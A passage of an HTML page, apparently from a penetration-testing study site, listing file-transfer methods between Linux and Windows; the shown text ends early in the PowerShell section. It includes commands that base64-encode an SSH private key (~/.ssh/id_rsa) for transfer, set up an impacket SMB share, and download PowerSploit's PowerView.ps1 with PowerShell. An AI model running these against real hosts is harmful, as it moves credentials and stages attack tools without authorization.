@@ -1,0 +1,1819 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Everything related to web application security under one roof">
+      
+      
+      
+        <link rel="canonical" href="https://quadrupl3d.github.io/redparrot/school/tiers/filetransfers/">
+      
+      
+        <link rel="prev" href="../services/">
+      
+      
+        <link rel="next" href="../../../devops/">
+      
+      
+      <link rel="icon" href="../../../assets/images/logo-bg.svg">
+      <meta name="generator" content="mkdocs-1.6.0, mkdocs-material-9.5.28">
+    
+    
+      
+        <title>File Transfers - RedParrot</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.6543a935.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.5.1/css/all.css">
+    
+      <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.5.1/css/sharp-light.css">
+    
+      <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.5.1/css/sharp-solid.css">
+    
+      <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.5.1/css/sharp-regular.css">
+    
+      <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.5.1/css/sharp-light.css">
+    
+      <link rel="stylesheet" href="../../../global.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+   <link href="../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>
+    html.glightbox-open { overflow: initial; height: 100%; }
+    .gslide-title { margin-top: 0px; user-select: text; }
+    .gslide-desc { color: #666; user-select: text; }
+    .gslide-image img { background: white; }
+    .gscrollbar-fixer { padding-right: 15px; }
+    .gdesc-inner { font-size: 0.75rem; }
+    body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color);}
+    body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color);}
+    body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color);}</style> <script src="../../../assets/javascripts/glightbox.min.js"></script></head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="red">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#file-transfers" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="RedParrot" class="md-header__button md-logo" aria-label="RedParrot" data-md-component="logo">
+      
+  <img src="../../../assets/images/logo-header.svg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            RedParrot
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              File Transfers
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.5.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M41.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.3 256l137.3-137.4c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../.." class="md-tabs__link">
+          
+  
+    
+  
+  Home
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../ctf/" class="md-tabs__link">
+          
+  
+    
+  
+  CTF
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../" class="md-tabs__link">
+          
+  
+    
+  
+  School
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../devops/" class="md-tabs__link">
+        
+  
+    
+  
+  DevOps
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../webdev/" class="md-tabs__link">
+          
+  
+    
+  
+  Web Applications
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../cybernews/" class="md-tabs__link">
+        
+  
+    
+  
+  News
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../community/" class="md-tabs__link">
+        
+  
+    
+  
+  Community
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="RedParrot" class="md-nav__button md-logo" aria-label="RedParrot" data-md-component="logo">
+      
+  <img src="../../../assets/images/logo-header.svg" alt="logo">
+
+    </a>
+    RedParrot
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../.." class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1">
+            <span class="md-nav__icon md-icon"></span>
+            Home
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../ctf/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    CTF
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            CTF
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    HackTheBox
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            HackTheBox
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ctf/hackthebox/machines/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Machines
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ctf/hackthebox/prolabs/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Prolabs
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ctf/hackthebox/exams/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Exams
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    School
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            School
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Tiers
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            Tiers
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../unixbasics/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Fundamentals
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nmap/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Nmap
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../os/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../services/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Services
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    File Transfers
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    File Transfers
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#file-transfer-methods" class="md-nav__link">
+    <span class="md-ellipsis">
+      File Transfer Methods
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="File Transfer Methods">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#windows-file-transfer-methods" class="md-nav__link">
+    <span class="md-ellipsis">
+      Windows File Transfer Methods
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Windows File Transfer Methods">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#downloading-files-from-linux-to-windows" class="md-nav__link">
+    <span class="md-ellipsis">
+      Downloading files from Linux to Windows
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#uploading-files-from-windows-to-linux" class="md-nav__link">
+    <span class="md-ellipsis">
+      Uploading files from Windows to Linux
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#linux-file-transfer-methods" class="md-nav__link">
+    <span class="md-ellipsis">
+      Linux File Transfer Methods
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Linux File Transfer Methods">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#downloading-files-from-remote-host-to-linux" class="md-nav__link">
+    <span class="md-ellipsis">
+      Downloading files from remote host to Linux
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#uploading-files-from-remote-host-to-linux" class="md-nav__link">
+    <span class="md-ellipsis">
+      Uploading files from remote host to Linux
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#transferring-files-with-code" class="md-nav__link">
+    <span class="md-ellipsis">
+      Transferring Files with Code
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#miscellaneous-file-transfer-methods" class="md-nav__link">
+    <span class="md-ellipsis">
+      Miscellaneous File Transfer Methods
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Miscellaneous File Transfer Methods">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#netcat" class="md-nav__link">
+    <span class="md-ellipsis">
+      NetCat
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ncat" class="md-nav__link">
+    <span class="md-ellipsis">
+      Ncat
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#devtcp" class="md-nav__link">
+    <span class="md-ellipsis">
+      /dev/tcp
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#powershell-remoting" class="md-nav__link">
+    <span class="md-ellipsis">
+      Powershell remoting
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rdp" class="md-nav__link">
+    <span class="md-ellipsis">
+      RDP
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../devops/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DevOps
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../webdev/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Web Applications
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_5" id="__nav_5_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            Web Applications
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_2" id="__nav_5_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Tiers
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_2">
+            <span class="md-nav__icon md-icon"></span>
+            Tiers
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../webdev/tiers/jsbasics/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    JavaScript
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cybernews/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    News
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../community/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Community
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#file-transfer-methods" class="md-nav__link">
+    <span class="md-ellipsis">
+      File Transfer Methods
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="File Transfer Methods">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#windows-file-transfer-methods" class="md-nav__link">
+    <span class="md-ellipsis">
+      Windows File Transfer Methods
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Windows File Transfer Methods">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#downloading-files-from-linux-to-windows" class="md-nav__link">
+    <span class="md-ellipsis">
+      Downloading files from Linux to Windows
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#uploading-files-from-windows-to-linux" class="md-nav__link">
+    <span class="md-ellipsis">
+      Uploading files from Windows to Linux
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#linux-file-transfer-methods" class="md-nav__link">
+    <span class="md-ellipsis">
+      Linux File Transfer Methods
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Linux File Transfer Methods">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#downloading-files-from-remote-host-to-linux" class="md-nav__link">
+    <span class="md-ellipsis">
+      Downloading files from remote host to Linux
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#uploading-files-from-remote-host-to-linux" class="md-nav__link">
+    <span class="md-ellipsis">
+      Uploading files from remote host to Linux
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#transferring-files-with-code" class="md-nav__link">
+    <span class="md-ellipsis">
+      Transferring Files with Code
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#miscellaneous-file-transfer-methods" class="md-nav__link">
+    <span class="md-ellipsis">
+      Miscellaneous File Transfer Methods
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Miscellaneous File Transfer Methods">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#netcat" class="md-nav__link">
+    <span class="md-ellipsis">
+      NetCat
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ncat" class="md-nav__link">
+    <span class="md-ellipsis">
+      Ncat
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#devtcp" class="md-nav__link">
+    <span class="md-ellipsis">
+      /dev/tcp
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#powershell-remoting" class="md-nav__link">
+    <span class="md-ellipsis">
+      Powershell remoting
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rdp" class="md-nav__link">
+    <span class="md-ellipsis">
+      RDP
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<h1 id="file-transfers"><strong>File Transfers</strong></h1>
+<h2 id="file-transfer-methods"><strong>File Transfer Methods</strong></h2>
+<h3 id="windows-file-transfer-methods"><strong>Windows File Transfer Methods</strong></h3>
+<h4 id="downloading-files-from-linux-to-windows"><span class="red-command">Downloading files from Linux to Windows</span></h4>
+<p><code class="invert">Via base64 encode-decode method</code>
+<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>~/.ssh/id_rsa<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-w<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>xclip<span class="w"> </span>-selection<span class="w"> </span>clipboard
+</code></pre></div></p>
+<div class="highlight"><pre><span></span><code><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">&gt;</span> <span class="no">[IO.File]</span><span class="p">::</span><span class="n">WriteAllBytes</span><span class="p">(</span><span class="s2">&quot;C:\Users\Public\id_rsa&quot;</span><span class="p">,</span> <span class="no">[Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(&lt;</span><span class="n">BASE64_ENCODED_CONTENTS_OF_A_FILE</span><span class="p">&gt;))</span>
+<span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">&gt;</span> <span class="nb">Get-FileHash</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Public</span><span class="p">\</span><span class="n">id_rsa</span> <span class="n">-Algorithm</span> <span class="n">md5</span>
+</code></pre></div>
+<p><code class="invert">Via SMB share</code>
+<div class="highlight"><pre><span></span><code>sudo impacket-smbserver share -smb2support file-transfer -user redparrot -password toor
+
+
+xfreerdp /u:&lt;username&gt; /p:&#39;&lt;password&gt;&#39; /v:&lt;RDP_SERVER&gt;
+C:\Users\ghost&gt; net use n: \\&lt;TUN0_IP&gt;\share /user:redparrot toor
+C:\Users\ghost&gt; net copy n:\file.zip
+C:\Users\ghost&gt; powershell
+PS C:\Users\ghost&gt; Expand-Archive -Path yourfile.zip -DestinationPath .
+PowerShell&gt; cd N:
+PS N:&gt; hasher file.txt &gt; hash.txt 
+PS N:&gt; exit
+
+# unmount the share N from windows, exit from RDP, stop sharing the share via SMB
+# Navigate to the share and get hash.txt
+</code></pre></div></p>
+<p><code class="invert">PowerShell Web Downloads</code></p>
+<div class="highlight"><pre><span></span><code><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">&gt;</span> <span class="c"># Example: (New-Object Net.WebClient).DownloadFile(&#39;&lt;Target File URL&gt;&#39;,&#39;&lt;Output File Name&gt;&#39;)</span>
+<span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">&gt;</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadFile</span><span class="p">(</span><span class="s1">&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1&#39;</span><span class="p">,</span><span class="s1">&#39;C:\Users\Public\Downloads\PowerView.ps1&#39;</span><span class="p">)</span>
+
+<span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">&gt;</span> <span class="c"># Example: (New-Object Net.WebClient).DownloadFileAsync(&#39;&lt;Target File URL&gt;&#39;,&#39;&lt;Output File Name&gt;&#39;)</span>
